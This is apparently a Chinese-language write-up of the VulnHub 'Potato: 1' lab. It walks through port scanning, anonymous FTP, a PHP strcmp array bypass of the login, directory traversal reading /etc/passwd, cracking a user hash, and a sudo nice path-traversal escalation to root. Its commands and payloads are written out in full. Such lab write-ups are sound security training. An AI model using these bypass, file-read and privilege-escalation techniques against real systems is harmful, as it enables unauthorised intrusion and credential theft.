# Potato: 1

2024-5-18 https://www.vulnhub.com/entry/potato-1,529/

difficulty: Easy to medium

## IP

192.168.5.29

## Scan

Open Port -> 22,80,2112

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ef240eabd2b316b44b2e27c05f48798b (RSA)
|   256 f2d8353f4959858507e6a20e657a8c4b (ECDSA)
|_  256 0b2389c3c026d5645e93b7baf5147f3e (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
```

先看看 2112 匿名登陆的 ftp 上有什么信息。 index.php.bak 是一个 php 页面的备份，从源码中可以得到用户凭据：admin:potato，但是不知道能不能用。

```
<?php
$pass= "potato"; //note Change this password regularly
if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>
```

pass 字段还被提示最好经常变动。

开始看 80 上的 web 服务，主页上是一个图片，看样子需要使用 gobuster 进行目录扫描：

```
gobuster dir -u http://192.168.5.29/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -e

http://192.168.5.29/index.php            (Status: 200) [Size: 245]
http://192.168.5.29/admin                (Status: 301) [Size: 312] [--> http://192.168.5.29/admin/]
http://192.168.5.29/potato               (Status: 301) [Size: 313] [--> http://192.168.5.29/potato/]
```

http://192.168.5.29/admin/logs/ 中看到了有 3 个 log 日志，记录着 admin 的密码被改动了。

http://192.168.5.29/admin/ 是登陆页面，输入上面得到的用户凭据，显示用户名或密码错误，看样子上面记录的日志是正确的。

需要对 strcmp 函数进行绕过，使用 BP 对登陆请求进行拦截，然后修改请求数据为 username=admin&password[]=potato ，这样就可以绕过 strcmp 的函数比较，成功登陆到系统，进入到 http://192.168.5.29/admin/dashboard.php 页面，同时在 cookie 中，我们看到了修改之后的密码：serdesfsefhijosefjtfgyuhjiosefdfthgyjh

在 log 标签对应的页面中，我们看到了http://192.168.5.29/admin/dashboard.php?page=log，这里存在文件包含漏洞：

```
POST /admin/dashboard.php?page=log HTTP/1.1
file=../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```

我们拿到了/etc/passwd 文件的内容，同时看到 webadmin 用户的密码没有存储在/etc/shadow 中，看看是否能得到用户对应的明文密码，使用 john 解密后得到了明文密码：dragon

使用得到的用户凭据 webadmin:dragon ssh 登陆到系统。

得到 user flag:

```
webadmin@serv:~$ cat user.txt
TGUgY29udHLDtGxlIGVzdCDDoCBwZXUgcHLDqHMgYXVzc2kgcsOpZWwgcXXigJl1bmU
```

sudo -l 查看特殊权限：

```
(ALL : ALL) /bin/nice /notes/*
```

/notes 中有 2 个文件：clear.sh、id.sh，使用 sudo nice /notes/id.sh 后可以看到用户的 id，说明 nice 执行了这个 sh，同时，/notes/\* 存在目录穿越，在/tmp 中创建一个 xx.sh：

```
cd /tmp
touch xx.sh
chmod +x xx.sh
echo '/bin/bash -p' > xx.sh
```

执行 sudo 最终得到了 root 权限：

```
webadmin@serv:/tmp$ sudo nice /notes/../../../tmp/xx.sh
root@serv:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@serv:/tmp# cd /root
root@serv:~# cat root.txt
bGljb3JuZSB1bmlqYW1iaXN0ZSBxdWkgZnVpdCBhdSBib3V0IGTigJl1biBkb3VibGUgYXJjLWVuLWNpZWwuIA==
```
